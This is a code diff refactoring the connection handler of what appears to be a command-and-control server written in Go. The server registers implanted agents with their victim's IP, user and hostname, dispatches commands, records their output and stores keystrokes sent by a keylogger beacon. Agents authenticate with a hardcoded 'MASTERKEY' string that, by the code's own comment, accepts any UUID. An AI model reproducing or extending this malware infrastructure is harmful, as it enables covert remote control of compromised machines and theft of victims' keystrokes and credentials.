@@ -3,7 +3,6 @@ package main
 import (
 	"bufio"
 	"crypto/tls"
-	"database/sql"
 	"encoding/gob"
 	"fmt"
 	"log"
@@ -37,7 +36,7 @@ func IsValidUUID(u string) bool {
 	return err == nil
 }
 
-func handleconn(db *sql.DB, connection net.Conn) {
+func handleconn(connection net.Conn) {
 	for {
 
 		text, _ := bufio.NewReader(connection).ReadString('\n')
@@ -61,14 +60,19 @@ func handleconn(db *sql.DB, connection net.Conn) {
 				if IsValidUUID(uid) {
 
 					// search uuid in database using received uuid
-					fetch := data.FetchOneAgent(db, uid)                  // first pass agent check
+					fetch, err := data.FetchOneAgent(uid)                  // first pass agent check
+					if err != nil {
+						logger.Logf(logger.Warning, "Couldn't fetch an agent: %s\n", err)
+					}
 					if fetch.Uuid == "" && masterkey == "MASTERKEY" { //prob check its a uuid and master key                // future fix (accepts all uuid) reason: to allow server create agent record in db
 						//parse IP, hostname and user from agent
-						data.CreateAgent(db, uid, AgentServerIP+":"+AgentServerPort, AgentFreq, AgentJitter, ip, user, hostname) // default values (callback set by user)
-						data.CreateKeys(db, uid)
+						data.CreateAgent(uid, AgentServerIP+":"+AgentServerPort, AgentFreq, AgentJitter, ip, user, hostname) // default values (callback set by user)
+						data.CreateKeys( uid)
 					}
-					fetch = data.FetchOneAgent(db, uid) // second pass agent check
-
+					fetch, err = data.FetchOneAgent( uid) // second pass agent check
+					if err != nil {
+						logger.Logf(logger.Warning, "Couldn't fetch an agent: %s\n", err)
+					}
 					logger.Logf(logger.Info, "Agent %s Fetched for validation\n", fetch.Uuid)
 					if uid == fetch.Uuid {
 						// Handle command response
@@ -76,7 +80,7 @@ func handleconn(db *sql.DB, connection net.Conn) {
 
 							logger.Logf(logger.Info, "Agent %s Connected\n", uid)
 							encoder := gob.NewEncoder(connection)
-							instruct := data.FetchNextCommand(db, fetch.Uuid)
+							instruct := data.FetchNextCommand( fetch.Uuid)
 							logger.Logf(logger.Info, "Fetched %s \n", instruct.CommandType)
 							if err := encoder.Encode(instruct); err != nil {
 								log.Fatalln(err)
@@ -90,7 +94,7 @@ func handleconn(db *sql.DB, connection net.Conn) {
 								connection.Close()
 							} else {
 								logger.Logf(logger.Debug, "Agent %s Sent Back: %s\n", uid, destruct.Output)
-								data.UpdateAgentCommand(db, destruct.CommandUUID, destruct.Output, fetch.Uuid)
+								data.UpdateAgentCommand( destruct.CommandUUID, destruct.Output, fetch.Uuid)
 								if destruct.Output == "~Killed~" {
 									logger.Logf(logger.Warning, "Agent %s Killed\n", uid)
 									connection.Close()
@@ -98,7 +102,7 @@ func handleconn(db *sql.DB, connection net.Conn) {
 								connection.Close()
 							}
 							now := time.Now()
-							data.UpdateAgentCheckIn(db, uid, now.Unix())
+							data.UpdateAgentCheckIn( uid, now.Unix())
 						} else if keyOrNot == "KeysBeacon" { // Handle keylog response
 
 							logger.Logf(logger.Info, "Agent %s Keys Beacon Connected\n", uid)
@@ -114,14 +118,14 @@ func handleconn(db *sql.DB, connection net.Conn) {
 
 							if destruct.Keys != "" {
 								logger.Logf(logger.Debug, "Agent %s with keys: %s\n", uid, destruct.Keys)
-								data.UpdateAgentKeys(db, uid, destruct.Keys)
+								data.UpdateAgentKeys( uid, destruct.Keys)
 								connection.Close()
 							} else {
 								logger.Logf(logger.Debug, "Agent %s Sent Back No Keys\n", uid)
 								connection.Close()
 							}
 							now := time.Now()
-							data.UpdateAgentCheckIn(db, uid, now.Unix())
+							data.UpdateAgentCheckIn( uid, now.Unix())
 						} else {
 							logger.Logf(logger.Info, "Unknown Beacon Type\n")
 							connection.Close()
@@ -160,13 +164,8 @@ func main() {
 	c2serverip := goDotEnvVariable("C2SERVER_IP")
 	c2serverport := goDotEnvVariable("C2SERVER_PORT")
 
-	db := data.OpenDatabase()
-	defer db.Close()
-	data.InitDatabase(db)
-	// _, error := os.Stat("./data/sqlite-database.db")
-	// if os.IsNotExist(error) {
-	// 	data.InitDatabase()
-	// }
+	data.OpenDatabase()
+
 	cer, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
 	if err != nil {
 		log.Fatal(err)
@@ -183,14 +182,14 @@ func main() {
 	for {
 		select {
 		case <-ticker:
-			go data.UpdateAgentStatus(db)
+			go data.UpdateAgentStatus()
 		default:
 			connection, err := listener.Accept()
 			if err != nil {
 				log.
 					Fatalln(err)
 			}
-			go handleconn(db, connection)
+			go handleconn(connection)
 		}
 
 	}
